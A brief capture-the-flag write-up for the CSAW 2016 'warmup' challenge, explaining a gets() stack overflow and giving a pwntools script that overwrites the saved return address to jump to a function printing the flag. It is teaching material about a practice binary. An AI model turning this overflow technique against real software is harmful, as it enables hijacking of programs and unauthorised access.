
# csaw16_warmup - CSAW CTF 2016 Quals (Ret2Win Easy)

**Binary:** ELF 64-bit executable, not stripped
**Protections:** NX enabled, No canary, No PIE (base 0x400000)
**Vulnerability:** gets() on 64-byte buffer → unlimited overflow to saved RIP

**Analysis:**

- Program prints "-Warm Up-" and address of `easy` function (0x40060d)
- gets(input) → no size limit
- Buffer size ~64 bytes, offset to saved RIP: 0x48 (72 bytes) or 0x40 in some envs
- `easy()` function: system("cat flag.txt") → prints flag

**Exploit Steps:**

- Overflow buffer with filler
- Overwrite saved RIP with easy address (0x40060d)
- On ret → jumps to easy → cat flag.txt

**Pwntools Exploit:**

```python
from pwn import *

p = process('./warmup')

# Receive leaked easy address (optional, but printed)
print(p.recvuntil("WOW:"))
easy_addr = int(p.recvline().strip(), 16)
log.info(f"Leaked easy: {hex(easy_addr)}")

# Payload: filler + easy address
payload = b"A" * 0x48 + p64(easy_addr)  # Adjust to 0x40 if needed

p.sendline(payload)
print(p.recvall())
```
